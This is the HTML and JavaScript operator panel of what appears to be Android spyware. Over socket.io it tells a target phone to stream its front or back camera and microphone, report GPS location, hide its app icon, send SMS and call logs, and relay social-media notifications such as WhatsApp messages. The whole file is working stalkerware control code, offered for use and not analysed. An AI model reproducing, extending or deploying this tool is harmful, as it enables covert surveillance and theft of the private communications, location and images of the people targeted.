<!DOCTYPE html>
<html>
<head>
    <title>Control Center v3</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #333; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .video-box { background: #000; width: 100%; height: 350px; display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 8px; }
        #live-frame { width: 100%; height: 100%; object-fit: contain; display: none; }
        select, button { padding: 12px; margin: 5px; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; }
        select { background: #333; color: white; width: 100%; }
        .btn-green { background: #28a745; color: white; }
        .btn-red { background: #dc3545; color: white; }
        .log-screen { background: black; color: #0f0; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; border: 1px solid #444; }
        table { width: 100%; font-size: 12px; border-collapse: collapse; }
        th, td { border-bottom: 1px solid #333; padding: 5px; text-align: left; }
    </style>
</head>
<body>

    <h2>ðŸ“± System Monitor Pro</h2>

    <div class="grid">
        <div class="card" style="grid-column: span 2;">
            <div class="video-box">
                <img id="live-frame" src="">
                <p id="placeholder">Feed Offline</p>
            </div>
            
            <div style="display: flex; gap: 10px; margin-top: 15px;">
                <select id="cam-index">
                    <option value="0">Back Camera</option>
                    <option value="1">Front Camera</option>
                </select>
                <select id="stream-mode">
                    <option value="video">Only Video</option>
                    <option value="audio-video">Audio + Video</option>
                    <option value="photo">Single Photo</option>
                </select>
                <button class="btn-green" onclick="executeStream()">START</button>
                <button class="btn-red" onclick="sendCmd('stop-stream')">STOP</button>
            </div>
        </div>

        <div class="card">
            <h3>ðŸ“Š Device Info</h3>
            <p>Battery: <span id="batt">--</span>%</p>
            <p>GPS: <span id="loc">Waiting...</span></p>
            <button onclick="sendCmd('get-gps')">Update GPS</button>
            <button onclick="sendCmd('hide-icon')" style="background:#444; color:white;">Hide Icon</button>
            <button onclick="sendCmd('show-icon')" style="background:#444; color:white;">Show Icon</button>
        </div>

        <div class="card">
            <h3>ðŸ“‚ Data Extraction</h3>
            <button onclick="sendCmd('get-sms')">Fetch SMS</button>
            <button onclick="sendCmd('get-calls')">Fetch Calls</button>
            <div id="data-log" class="log-screen">> System Ready...</div>
        </div>
    </div>
<div class="card">
    <h3>ðŸ’¬ Social Media Monitor</h3>
    <div id="notif-log" class="log-screen" style="height: 250px;">
        > Waiting for notifications...
    </div>
</div>
    <script>
        const socket = io();

        function sendCmd(cmd) { socket.emit('phone-execute', cmd); }

        function executeStream() {
            const cam = document.getElementById('cam-index').value;
            const mode = document.getElementById('stream-mode').value;
            if (mode === 'photo') {
                sendCmd(cam === "0" ? 'camera-back' : 'camera-front');
            } else {
                sendCmd(`stream:${cam}:${mode}`);
            }
        }

        socket.on('battery-update', (d) => { document.getElementById('batt').innerText = d; });
        
        socket.on('location-update', (d) => {
            document.getElementById('loc').innerHTML = `<a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank" style="color:#007bff">Map View</a>`;
        });

        socket.on('data-stream', (base64) => {
            document.getElementById('placeholder').style.display = 'none';
            const img = document.getElementById('live-frame');
            img.style.display = 'block';
            img.src = "data:image/jpeg;base64," + base64;
        });

        socket.on('audio-stream', (base64) => {
            const audio = new Audio("data:audio/wav;base64," + base64);
            audio.play().catch(e => {});
        });

        socket.on('sms-data', (data) => {
            const logs = JSON.parse(data);
            let h = "<table><tr><th>From</th><th>SMS</th></tr>";
            logs.forEach(m => h += `<tr><td>${m.from}</td><td>${m.body}</td></tr>`);
            document.getElementById('data-log').innerHTML = h + "</table>";
        });

        socket.on('call-data', (data) => {
            const logs = JSON.parse(data);
            let h = "<table><tr><th>Number</th></tr>";
            logs.forEach(c => h += `<tr><td>${c.num}</td></tr>`);
            document.getElementById('data-log').innerHTML = h + "</table>";
        });
        socket.on('notif-data', (data) => {
        const log = document.getElementById('notif-log');
        const time = new Date().toLocaleTimeString();
        
        // Format: [WhatsApp] John: Hello there!
        const entry = `<p style="margin:5px 0; border-bottom:1px solid #222;">
            <span style="color:#28a745;">[${data.app.split('.').pop()}]</span> 
            <strong>${data.title}:</strong> ${data.message} 
            <small style="color:#666; float:right;">${time}</small>
        </p>`;
        
        log.innerHTML = entry + log.innerHTML;
    });
    </script>
</body>
</html>

